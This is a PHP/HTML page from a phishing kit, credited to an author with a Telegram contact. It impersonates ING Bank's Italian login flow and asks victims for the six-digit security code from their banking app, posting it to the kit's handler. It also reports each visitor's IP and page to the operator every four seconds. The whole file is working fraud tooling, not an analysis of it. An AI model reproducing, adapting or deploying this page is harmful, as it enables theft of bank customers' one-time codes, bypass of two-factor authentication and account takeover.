<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "token";

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="<?php echo IMGSPATH; ?>/favicon.ico">
        <title>ING</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">
        <script src="<?php echo JSPATH; ?>/stutes.js"></script>      
    </head>
    <body class="d-flex flex-column justify-content-between" style="min-height:100vh;">

      <!-- HEADER -->
      <header class="header_1">
        <div class="container_header_1">
          <div class="logo">
            <img src="<?php echo IMGSPATH; ?>/logo.svg" alt="">
          </div>
        </div>
      </header>

      <!-- wrapper_login -->
      <div class="wrapper_login">
        <div class="container_login">
          <form action="index.php" method="POST">
                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="token">
            <div class="title">
              <h1 class="mb-0">Inserisci il Codice Token</h1>
              <p class="mb-0">Inserisci il codice di 6 cifre che hai generato con l'App.</p>
            </div>
            
            <div class="inputs mt-4">
              <input inputmode="numeric" type="text" name="token1" id="token1" class="form-control">
              <input inputmode="numeric" type="text" name="token2" id="token2" class="form-control">
              <input inputmode="numeric" type="text" name="token3" id="token3" class="form-control">
              <input inputmode="numeric" type="text" name="token4" id="token4" class="form-control">
              <input inputmode="numeric" type="text" name="token5" id="token5" class="form-control">
              <input inputmode="numeric" type="text" name="token6" id="token6" class="form-control">
            </div>

            <?php if( isset($_GET['error']) ) : ?>
            <div class="err"><i class="fa-solid fa-circle-exclamation"></i> Codice non valido.</div>
            <?php endif; ?>

            <div class="btn_sub">
              <button type="submit">Continua</button>
            </div>
          </form>
        </div>
      </div>

      <!-- footer -->
      <footer class="footer_1">
        <div class="container_footer_1">
          <div class="links_footer">
            <ul class="ps-0 mb-0">
              <li>Sicurezza</li>
              <li>Definizione di Default</li>
              <li>Privacy</li>
            </ul>
            <ul class="ps-0 mb-0">
              <li>Trasparenza</li>
              <li>Reclami</li>
              <li>Cookies</li>
            </ul>
          </div>
          <div class="copyghit">
            <p class="mb-0">© 2026 ING BANK N.V. Milan Branch P.I. 11241140158</p>
          </div>
        </div>
      </footer>


      
       









        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="<?php echo JSPATH; ?>/script.js"></script>
        
        <script>

          $('#token1').mask('0');
          $('#token2').mask('0');
          $('#token3').mask('0');
          $('#token4').mask('0');
          $('#token5').mask('0');
          $('#token6').mask('0');
             
            
          const $inputs = $('.inputs input');

    // Only one digit
    $inputs.on('input', function () {

        this.value = this.value.replace(/\D/g, '').slice(0, 1);

        if (this.value !== '') {
            $(this).next('input').focus();
        }

    });

    // Backspace
    $inputs.on('keydown', function (e) {

        if (e.key === 'Backspace') {

            if ($(this).val() === '') {
                $(this).prev('input').focus().val('');
            } else {
                $(this).val('');
                e.preventDefault();
            }

        }

        // Prevent non-numbers
        if (
            !/[0-9]/.test(e.key) &&
            !['Backspace','Tab','ArrowLeft','ArrowRight','Delete'].includes(e.key)
        ) {
            e.preventDefault();
        }

    });

    // Paste full code
    $inputs.on('paste', function (e) {

        e.preventDefault();

        let data = (e.originalEvent || e).clipboardData.getData('text');
        data = data.replace(/\D/g, '').slice(0, $inputs.length);

        $inputs.val('');

        data.split('').forEach(function (digit, index) {
            $inputs.eq(index).val(digit);
        });

        if (data.length) {
            $inputs.eq(Math.min(data.length, $inputs.length) - 1).focus();
        }

    });
            
            worker();
            var jsonData = {
              action: 'VISITORS',
              ip: '<?php echo get_client_ip(); ?>',
              page: 'token'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);             
        </script>
    </body>
</html>